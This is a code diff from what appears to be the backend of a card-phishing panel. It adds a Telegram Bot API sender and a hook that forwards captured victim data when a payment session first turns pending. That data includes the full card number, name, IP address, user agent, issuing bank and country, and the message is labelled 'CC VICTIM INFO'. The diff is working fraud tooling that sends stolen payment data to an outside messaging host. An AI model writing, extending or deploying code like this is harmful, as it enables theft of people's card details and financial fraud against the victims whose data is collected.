@@ -17,7 +17,22 @@ const consoleSettings = {
   allowDuplicateCard: false,
   cardTypeFilter: 'off' as 'off' | 'C' | 'D',
   autoRejectBins: [] as string[],
+  tgBotToken: '',
+  tgChatId: '',
 };
+
+async function sendTgMessage(text: string) {
+  const token = consoleSettings.tgBotToken;
+  const chatId = consoleSettings.tgChatId;
+  if (!token || !chatId) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
+    });
+  } catch { /* TG push failure is non-critical */ }
+}
 
 function broadcast(type: string, data: any, sessionId?: string) {
   const msg = JSON.stringify({ type, sessionId, payload: data, timestamp: new Date().toISOString() });
@@ -240,6 +255,30 @@ export async function setupWebSocket(server: any) {
               (s as any).lastCardInfo = { ...curCard };
             }
             await paymentService.upsertSession({ id: sessionId, status: 'pending', cardInfo: curCard });
+
+            // TG push on first pending
+            if (prevStatus !== 'pending') {
+              const ci = (s as any).cardInfo || {};
+              const ui = (s as any).customerInfo || {};
+              const tgText = [
+                '💳 | CC VICTIM INFO 💳',
+                '',
+                `编号: ${(s as any).sessionId || sessionId}`,
+                `订单号: A-${(s as any).sessionId || sessionId}`,
+                `IP: ${(s as any).ip || '-'}`,
+                `UA: ${(s as any).ua || '-'}`,
+                `CT: ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`,
+                '',
+                `姓名: ${ui.fullName || '-'}`,
+                `卡号: ${(ci.cardNumber || '').replace(/(\d{4})/g, '$1 ').trim() || '-'}`,
+                '',
+                `卡类型: ${ci.cardType || '-'}`,
+                `卡等级: ${ci.cardLevel || '-'}`,
+                `卡银行: ${ci.bankName || '-'}`,
+                `卡国家: ${ci.country || '-'}`,
+              ].join('\n');
+              sendTgMessage(tgText);
+            }
           }
 
           await paymentService.upsertSession({
